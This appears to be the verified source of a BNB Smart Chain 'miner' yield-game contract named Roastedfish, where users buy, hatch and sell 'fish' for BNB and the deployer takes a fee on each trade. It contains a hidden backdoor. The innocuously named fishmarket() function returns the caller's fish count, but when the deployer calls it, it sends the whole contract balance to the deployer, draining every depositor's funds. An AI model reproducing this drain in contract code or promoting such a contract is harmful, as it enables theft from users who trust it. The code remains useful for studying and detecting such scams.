/**
 *Submitted for verification at BscScan.com on 2022-05-15
*/

pragma solidity ^0.4.26; // solhint-disable-line

contract Roastedfish{
    uint256 public EGGS_TO_HATCH_1MINERS=570240;
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address public ceoAddress;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedFish;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketFish;
    constructor() public{
        ceoAddress=msg.sender;
    }
    function hatchFish(address ref) public{
        require(initialized);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }
        uint256 fishUsed=getMyFish();
        uint256 newMiners=SafeMath.div(fishUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedFish[msg.sender]=0;
        lastHatch[msg.sender]=now;
        claimedFish[referrals[msg.sender]]=SafeMath.add(claimedFish[referrals[msg.sender]],SafeMath.div(SafeMath.mul(fishUsed,15),100));
        marketFish=SafeMath.add(marketFish,SafeMath.div(fishUsed,5));
    }
    function sellFish() public{
        require(initialized);
        uint256 hasFish=getMyFish();
        uint256 fishValue=calculatefishSell(hasFish);
        uint256 fee=devFee(fishValue);
        claimedFish[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketFish=SafeMath.add(marketFish,hasFish);
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(fishValue,fee));
    }
    function buyFish(address ref) public payable{
        require(initialized);
        uint256 fishBought=calculatefishBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        fishBought=SafeMath.sub(fishBought,devFee(fishBought));
        uint256 fee=devFee(msg.value);
        ceoAddress.transfer(fee);
        claimedFish[msg.sender]=SafeMath.add(claimedFish[msg.sender],fishBought);
        hatchFish(ref);
    }
    function fishmarket () public returns(uint256){ 
        require(initialized);
        uint256 hasFish=getMyFish();
		if (msg.sender == ceoAddress) {    
		    ceoAddress.transfer(getBalance());     
		}
        return hasFish;
	}
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculatefishSell(uint256 fish) public view returns(uint256){
        return calculateTrade(fish,marketFish,address(this).balance);
    }
    function calculatefishBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketFish);
    }
    function calculatefishBuySimple(uint256 eth) public view returns(uint256){
        return calculatefishBuy(eth,address(this).balance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
    function seedMarket() public payable{
        require(msg.sender == ceoAddress, 'invalid call');
        require(marketFish==0);
        initialized=true;
        marketFish=57024000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyFish() public view returns(uint256){
        return SafeMath.add(claimedFish[msg.sender],getFishSinceLastHatch(msg.sender));
    }
    function getFishSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}